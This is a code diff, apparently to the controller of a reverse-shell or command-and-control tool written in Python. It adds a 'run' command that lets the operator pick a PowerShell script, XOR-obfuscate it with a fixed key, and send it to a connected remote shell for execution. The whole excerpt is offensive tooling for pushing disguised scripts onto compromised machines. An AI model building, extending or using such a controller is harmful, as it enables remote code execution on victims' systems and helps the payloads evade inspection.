@@ -2,6 +2,8 @@ import socket
 import threading
 import logging
 import time
+import tkinter as tk
+from tkinter import filedialog
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -56,6 +58,9 @@ def handle_client(client_socket, shell_id):
                 elif command == "list":
                     response = "Active shells:\n" + "\n".join(active_shells.keys())
 
+                elif command == "run":
+                    response = execute_ps1_script(shell_id)
+
                 else:
                     if current_shell == shell_id:
                         response = f"Executing command: {command}"  # Simulating command execution
@@ -67,6 +72,23 @@ def handle_client(client_socket, shell_id):
             except Exception as e:
                 logging.error(f"Error handling client: {e}")
                 break
+
+def execute_ps1_script(shell_id):
+    root = tk.Tk()
+    root.withdraw()
+    file_path = filedialog.askopenfilename(filetypes=[("PowerShell Scripts", "*.ps1")])
+    if file_path:
+        try:
+            with open(file_path, 'r') as file:
+                script_content = file.read()
+            encrypted_script = xor_encrypt_decrypt(script_content, 16)
+            active_shells[shell_id].send(encrypted_script.encode())
+            return f"Executing script: {file_path}"
+        except Exception as e:
+            logging.error(f"Error executing script: {e}")
+            return f"Error executing script: {str(e)}"
+    else:
+        return "No script selected"
 
 def update_shells():
     while True:
